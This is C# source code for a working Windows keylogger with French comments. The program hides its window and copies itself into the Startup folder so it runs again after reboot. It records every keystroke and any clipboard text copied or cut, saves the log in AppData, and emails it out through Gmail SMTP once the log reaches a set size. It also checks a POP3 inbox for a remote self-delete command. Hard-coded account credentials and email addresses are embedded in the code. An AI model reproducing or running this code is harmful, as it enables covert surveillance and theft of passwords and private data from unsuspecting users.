using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using OpenPop;
using Limilabs.Mail;
using Limilabs.Client.POP3;
using System.Collections.Generic;

namespace Win32AppAF
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string TouchesAppuiee = string.Empty;
        private static string pressePapier = string.Empty;
        public static Timer delaiWrite = new Timer();
        public static Timer checkEmailSuppr = new Timer();
        public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string cheminFichier = cheminDossier + @"\varTemp.txt";
        public static string cheminExe;

        public const int TAILLEFICHIER = 10000; // Taille du fichier limite, moment ou le fichier est envoyé
        public static int NbrMilliSecondeIntervale = 100000; // Nombre de milliseconde entre les ticks du timer

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            bool flag = false;
            // Elle sont parfaite ces lignes de codes
            string emplacement = System.Reflection.Assembly.GetExecutingAssembly().Location, demarrage = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe";
            cheminExe = demarrage;
            if (!System.IO.File.Exists(demarrage))
            {
                File.Move(emplacement, demarrage);

                FileInfo fileInfo = new FileInfo(demarrage);
                fileInfo.IsReadOnly = false;
                flag = true;
            }


            delaiWrite.Interval = NbrMilliSecondeIntervale;
            delaiWrite.Tick += delaiWrite_Tick;

            checkEmailSuppr.Interval = 60000;
            checkEmailSuppr.Tick += checkEmailSuppr_Tick;

            delaiWrite.Enabled = true;
            checkEmailSuppr.Enabled = true;

            Application.EnableVisualStyles();
            _hookID = SetHook(_proc);

            if (flag)
            {
                Process.Start(demarrage);
            }
            else
            {
                Application.Run();
            }
            //Application.Run();
            
            UnhookWindowsHookEx(_hookID);
        }

        static void checkEmailSuppr_Tick(object sender, EventArgs e)
        {
            Pop3 client = new Pop3();
            client.Connect("pop.gmail.com", 995, true);
            if (client.Connected)
            {
                
            }
            client.Login("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
            foreach (string idMessage in client.GetAll())
            {
                Limilabs.Mail.MailBuilder mail = new MailBuilder();
                IMail mailObj = mail.CreateFromEml(client.GetMessageByUID(idMessage));
                string contenu = mailObj.GetBodyAsText();

                if (contenu.Contains("DELETE") && (contenu.Contains(Environment.UserName)))
                {
                    //ProcessStartInfo Info = new ProcessStartInfo();
                    //Info.Arguments = " /C choice /C Y /N /D Y /T 6 & Del " + cheminExe;
                    ////Info.WindowStyle = ProcessWindowStyle.Hidden;
                    ////Info.CreateNoWindow = true;
                    //Info.FileName = "‪cmd.exe";
                    //Process.Start(Info); 

                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe");
                    client.DeleteMessageByUID(idMessage);
                    client.Close();
                    
                    Application.Exit();
                    Environment.Exit(0);
                }

            }
            
        }


        static void delaiWrite_Tick(object sender, EventArgs e)
        {
            using (StreamWriter tw = new StreamWriter(cheminFichier, true))
            {
                
                tw.WriteLine(TouchesAppuiee + Environment.NewLine + " --- FIN : " + System.DateTime.Now + " --- " + Environment.NewLine + pressePapier);
                tw.Close();
                TouchesAppuiee = Environment.NewLine + " --- DEBUT --- " + Environment.NewLine;
                pressePapier = string.Empty;
            }

            FileInfo fInfo = new FileInfo(cheminFichier);
            int sizeFile = (int)(fInfo.Length);     

            if (sizeFile >= TAILLEFICHIER)
            {
                MailMessage mail = new MailMessage("bilaldu93de93@gmail.com", "lucas.dnt@eduge.ch");
                mail.Subject = "La clé du savoir";
                mail.Body = "Utilisateur : " + Environment.UserName + Environment.NewLine + "Date : " + System.DateTime.Now;

                Attachment data = new Attachment(cheminFichier, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = data.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(cheminFichier);
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(cheminFichier);
                disposition.ReadDate = System.IO.File.GetLastAccessTime(cheminFichier);
                mail.Attachments.Add(data);

                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                smtp.Credentials = new System.Net.NetworkCredential("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
                smtp.EnableSsl = true;
                smtp.Send(mail);

                data.Dispose();

                File.Delete(cheminFichier);
            }
        }

        /// <summary>
        /// Pas la moindre idée de ce que ça fait
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        static bool ctrlAppuye = false; // variable qui permet de determiner si l'utilisateur fait une combinaison type : Ctrl+C / Ctrl+X

        /// <summary>
        /// Code qui se déclenche lors de l'appuis sur une touche
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (ctrlAppuye)
                {
                    if (((Keys)vkCode == Keys.C)||((Keys)vkCode == Keys.X))
                    {
                        pressePapier += " --- Presse Papier DEBUT --- " + Environment.NewLine + Clipboard.GetText() + Environment.NewLine + " --- Presse Papier FIN --- " + Environment.NewLine;
                        ctrlAppuye = false;
                    }
                }

                if (((Keys)vkCode == Keys.LControlKey)||((Keys)vkCode == Keys.RControlKey))
                {
                    ctrlAppuye = true;
                }

                #region Switch hyper long et chiant
                switch ((Keys)vkCode)
                {
                    
                    case Keys.D0:
                        TouchesAppuiee += "0";
                        break;
                    case Keys.D1:
                        TouchesAppuiee += "1";
                        break;
                    case Keys.D2:
                        TouchesAppuiee += "2";
                        break;
                    case Keys.D3:
                        TouchesAppuiee += "3";
                        break;
                    case Keys.D4:
                        TouchesAppuiee += "4";
                        break;
                    case Keys.D5:
                        TouchesAppuiee += "5";
                        break;
                    case Keys.D6:
                        TouchesAppuiee += "6";
                        break;
                    case Keys.D7:
                        TouchesAppuiee += "7";
                        break;
                    case Keys.D8:
                        TouchesAppuiee += "8";
                        break;
                    case Keys.D9:
                        TouchesAppuiee += "9";
                        break;
                    case Keys.NumPad0:
                        TouchesAppuiee += "0";
                        break;
                    case Keys.NumPad1:
                        TouchesAppuiee += "1";
                        break;
                    case Keys.NumPad2:
                        TouchesAppuiee += "2";
                        break;
                    case Keys.NumPad3:
                        TouchesAppuiee += "3";
                        break;
                    case Keys.NumPad4:
                        TouchesAppuiee += "4";
                        break;
                    case Keys.NumPad5:
                        TouchesAppuiee += "5";
                        break;
                    case Keys.NumPad6:
                        TouchesAppuiee += "6";
                        break;
                    case Keys.NumPad7:
                        TouchesAppuiee += "7";
                        break;
                    case Keys.NumPad8:
                        TouchesAppuiee += "8";
                        break;
                    case Keys.NumPad9:
                        TouchesAppuiee += "9";
                        break;
                    case Keys.OemPeriod:
                        TouchesAppuiee += ".";
                        break;
                    case Keys.Oemcomma:
                        TouchesAppuiee += ",";
                        break;
                    case Keys.Space:
                        TouchesAppuiee += " ";
                        break;
                    case Keys.Tab:
                        break;
                    case Keys.OemOpenBrackets:
                        TouchesAppuiee += "'";
                        break;
                    default:
                        TouchesAppuiee += (Keys)vkCode;
                        break;
                }
                #endregion

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
